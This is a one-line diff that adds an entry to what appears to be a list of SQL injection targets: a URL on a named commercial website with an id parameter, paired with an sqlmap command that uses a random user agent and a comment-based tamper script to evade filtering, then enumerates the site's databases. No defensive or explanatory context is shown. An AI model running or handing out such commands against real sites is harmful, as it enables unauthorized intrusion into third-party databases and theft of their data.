@@ -1,0 +1,1 @@
+http://www.egypt-clutch.com/product.php?id=1 (GET)  # sqlmap.py -u http://www.egypt-clutch.com/product.php?id=1 --random-agent --tamper=space2comment --batch --dbs
